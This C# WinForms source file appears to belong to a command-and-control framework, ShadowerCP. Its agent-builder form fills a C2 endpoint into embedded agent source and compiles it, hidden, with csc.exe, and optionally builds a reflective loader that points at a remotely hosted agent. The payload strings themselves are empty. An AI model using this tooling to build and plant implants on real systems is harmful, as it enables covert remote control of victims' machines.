using ShadowerCP.Misc;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace ShadowerCP
{
    public partial class AgentBuilderForm : Form
    {
        //C2PATH
        private string agentcs = @"";
        // REFLECTAGENTPATH
        private string remotecs = @"";
        public AgentBuilderForm()
        {
            InitializeComponent();
            rdbtnExe.Checked= true;
            cmbExeType.SelectedIndex = 0;
            txtEndPoint.Text = ServerSettings.Instance.EndPointURL;
            lblreflectloader.Enabled = refelectloaderpath.Enabled= false;
        }

        void radioButton_CheckedChanged(object sender, EventArgs e)
        {
            RadioButton rbSelcted = sender as RadioButton;

            if (rbSelcted == null)
            {
                MessageBox.Show("Something went wrong !");
                return;
            }

           
            if (rbSelcted.Checked)
            {
               if(rbSelcted.Text.Trim().ToLower() =="exe")
                {
                    grpEXEType.Visible= true;
                    //grpDLLType.Visible= false;
                } else if (rbSelcted.Text.Trim().ToLower() == "dll")
                {
                    grpEXEType.Visible = false;
                    //grpDLLType.Visible = true;
                }
                else if (rbSelcted.Text.Trim().ToLower().StartsWith("xml"))
                {
                    grpEXEType.Visible = false;
                    //grpDLLType.Visible = false;
                }
            }
        }

        private void buildbinary(string strSrcCode, string exeType, string outputFileName)
        {
            string arguments = string.Empty;
            string outputFilePath = string.Empty;
            try
            {
                string compilerPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"; // Adjust the path based on your .NET version
                string outputFolder = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"buildref");
                //string outputFolder = Path.Combine(Directory.GetCurrentDirectory(), "buildref");
                if (!Directory.Exists(outputFolder))
                {
                    Directory.CreateDirectory(outputFolder);
                }
                string tempCsFilePath = Path.Combine(outputFolder, "TempSourceCode.cs");
                File.WriteAllText(tempCsFilePath, strSrcCode, Encoding.UTF8);
                if(Path.GetExtension(outputFileName.Trim()) == string.Empty)
                {
                    outputFileName = System.IO.Path.ChangeExtension(outputFileName, "exe");
                }
                outputFilePath = Path.Combine(outputFolder, outputFileName);
                                
                if (exeType.ToLower() == "console")
                {
                    arguments = $@"/out:""{outputFilePath}"" /target:exe /optimize /platform:anycpu ""{tempCsFilePath}""";
                }
                else
                {
                    arguments = $@"/out:""{outputFilePath}"" /target:winexe /optimize /platform:anycpu ""{tempCsFilePath}""";
                }

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    FileName = compilerPath,
                    Arguments = arguments,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    //Verb = "runas"
                 };

                using (Process process = new Process { StartInfo = startInfo })
                {
                    process.Start();
                    process.WaitForExit();

                    if (process.ExitCode == 0)
                    {
                        Console.WriteLine($"Compilation successful. Output file: {outputFilePath}");
                    }
                    else
                    {
                        string errorMessage = process.StandardError.ReadToEnd();
                        Console.WriteLine($"Compilation failed with error: {errorMessage}");
                    }
                }
            }
            catch (Exception ex)
            {

                throw;
            }
        }

        private void btnFormClose_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            string srcCode = Misc.EncodeActions.Decompress(agentcs);
            srcCode = srcCode.Replace("C2PATH", txtEndPoint.Text);
            buildbinary(srcCode, cmbExeType.SelectedItem.ToString().ToLower(), txtSaveAs.Text.Trim());
            if(chkReflectLoader.CheckState == CheckState.Checked)
            {
                srcCode = Misc.EncodeActions.Decompress(remotecs);
                srcCode = srcCode.Replace("REFLECTAGENTPATH", refelectloaderpath.Text.Trim()+ "/" +  txtSaveAs.Text.Trim());
                buildbinary(srcCode, cmbExeType.SelectedItem.ToString().ToLower(), txtRemoteAgentName.Text.Trim());
            }
        }

        private void chkReflectLoader_CheckStateChanged(object sender, EventArgs e)
        {
            lblSaveAsRemoteAgent.Enabled = txtRemoteAgentName.Enabled =  lblreflectloader.Enabled = refelectloaderpath.Enabled = chkReflectLoader.Checked;
        }

        private void AgentBuilderForm_Load(object sender, EventArgs e)
        {
        }
    }
